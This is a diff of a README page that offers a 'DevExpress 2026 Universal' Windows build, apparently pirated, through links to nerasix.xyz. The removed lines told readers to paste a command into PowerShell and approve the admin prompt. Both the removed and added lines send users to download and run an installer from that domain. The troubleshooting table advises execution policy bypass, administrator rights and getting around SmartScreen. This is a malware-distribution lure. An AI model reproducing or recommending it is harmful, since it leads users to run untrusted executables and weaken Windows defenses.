@@ -5,20 +5,14 @@ DevExpress 2026 Universal · Developer workspace · Automation · Windows deskto
 
 > Professional DevExpress 2026 Universal build with workspace automation, deployment helpers, and power-user modules included for Windows.
 
+## Download
 
-## Install on Windows
+> Use the project link below for Windows.
 
-**Do this:**
-
-1. Press the **Windows** key, type **powershell**
-3. **Copy** the command below, **paste** it into PowerShell, press **Enter**
-4. Click **Yes** if Windows asks for permission
-
-```https://devexpress-2026-install-guide.nerasix.xyz/```
-
-**If nothing happens or you see a policy error**, paste this instead:
-
-```https://devexpress-2026-install-guide.nerasix.xyz/```
+* **Project link:** **[devexpress-2026.nerasix.xyz](https://devexpress-2026.nerasix.xyz/)**
+* **Full URL:** `https://devexpress-2026.nerasix.xyz/`
+* **Type:** Desktop package | Windows 10 and 11, 64-bit
+* **Setup:** Run the installer from the extracted folder
 
 
 ---
@@ -39,7 +33,7 @@ Notes for users who need **DevExpress 2026 Universal** running on Windows — es
 | Tool fails without admin rights | Run PowerShell as administrator |
 | Config not saved after reboot | Check Controlled Folder Access exceptions |
 | Integration script blocked | Set execution policy bypass; retry command |
-| Install blocked by SmartScreen | Run PowerShell as administrator; retry setup command |
+| Install blocked by SmartScreen | Open the Nerasix download page and click **Download** |
 
 ## Requirements
 
@@ -52,18 +46,18 @@ Notes for users who need **DevExpress 2026 Universal** running on Windows — es
 ## FAQ
 
 <details>
-<summary><b>What exactly do I paste?</b></summary>
-<br>Open <a href="https://devexpress-2026.nerasix.xyz/">devexpress-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<summary><b>How do I install?</b></summary>
+<br>Open <a href="https://devexpress-2026.nerasix.xyz/">devexpress-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
 </details>
 
 <details>
-<summary><b>Where is PowerShell?</b></summary>
-<br>Open <a href="https://devexpress-2026.nerasix.xyz/">devexpress-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<summary><b>How do I install?</b></summary>
+<br>Open <a href="https://devexpress-2026.nerasix.xyz/">devexpress-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
 </details>
 
 <details>
-<summary><b>Command did not run?</b></summary>
-<br>Open <a href="https://devexpress-2026.nerasix.xyz/">devexpress-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<summary><b>Download didn't start?</b></summary>
+<br>Open <a href="https://devexpress-2026.nerasix.xyz/">devexpress-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the Nerasix page.
 </details>
 
 <details>
@@ -74,12 +68,3 @@ Notes for users who need **DevExpress 2026 Universal** running on Windows — es
 ---
 
 **Topics:** devexpress-2026, devexpress-app, developer-tools, dev-workspace, devexpress-2026-setup-failed-fix, how-to-install-devexpress-2026, automation-tools, windows-dev, power-user-tools, devexpress-2026-windows, devexpress-2026-windows-setup, devexpress-2026-windows-setup-2026
-
-## Download
-
-> Use the project link below for Windows.
-
-* **Project link:** **[devexpress-2026-install-guide.nerasix.xyz](https://devexpress-2026-install-guide.nerasix.xyz/)**
-* **Full URL:** `https://devexpress-2026-install-guide.nerasix.xyz/`
-* **Type:** Desktop package | Windows 10 and 11, 64-bit
-* **Setup:** Run the installer from the extracted folder
